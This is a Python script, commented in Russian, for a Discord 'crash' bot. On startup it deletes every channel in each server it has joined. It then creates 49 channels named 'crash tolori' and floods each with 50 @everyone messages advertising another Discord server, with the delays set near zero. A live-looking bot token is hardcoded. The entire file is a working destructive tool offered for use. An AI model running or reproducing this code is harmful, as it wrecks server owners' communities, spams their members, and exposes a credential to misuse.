import disnake
from disnake.ext import commands
import asyncio

# 🔧 НАСТРОЙКИ — меняй по желанию
TOKEN = "MTM5MjkzMDIxNDExNTQwOTk5MQ.GgypsO.j76BK4rsbwewt0GCtR1UmhI8rk0RU5Oia4Giu0"

NEW_CHANNEL_BASE_NAME = "crash tolori"   # Базовое имя каналов
WELCOME_MESSAGE = "@everyone Переезжаем на discord.gg/talori Регулярные розыгрыши денег, набор в стафф и самое главное большая дружная семья!"  # Сообщение для каждого канала

NUM_CHANNELS = 49           # Сколько каналов создать
MESSAGES_PER_CHANNEL = 50   # Сколько сообщений отправить в каждый канал

# Задержки в секундах
DELAY_BETWEEN_DELETE = 0.00000001    # Задержка после удаления каждого канала
DELAY_BETWEEN_CREATE = 0.00000001   # Задержка после создания каждого канала
DELAY_BETWEEN_MESSAGES = 0.0001  # Задержка между сообщениями в канале

intents = disnake.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Бот запущен как {bot.user}")

    for guild in bot.guilds:
        print(f"⚙️ Работаем на сервере: {guild.name}")
        await reset_server(guild)

async def reset_server(guild):
    print(f"🧨 Удаляем все каналы на сервере: {guild.name}")

    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"❌ Канал удалён: {channel.name}")
            await asyncio.sleep(DELAY_BETWEEN_DELETE)
        except Exception as e:
            print(f"❌ Ошибка при удалении канала {channel.name}: {e}")

    await asyncio.sleep(2)  # Дополнительная пауза после удаления всех каналов

    for i in range(1, NUM_CHANNELS + 1):
        channel_name = f"{NEW_CHANNEL_BASE_NAME}-{i}"
        try:
            new_channel = await guild.create_text_channel(channel_name)
            print(f"✅ Канал создан: {channel_name}")
            await asyncio.sleep(DELAY_BETWEEN_CREATE)

            for j in range(1, MESSAGES_PER_CHANNEL + 1):
                await new_channel.send(f"{WELCOME_MESSAGE} ({j})")
                print(f"📨 Сообщение отправлено в {channel_name}: {j}")
                await asyncio.sleep(DELAY_BETWEEN_MESSAGES)

        except Exception as e:
            print(f"❌ Ошибка при создании канала или отправке сообщений: {e}")

bot.run(TOKEN)
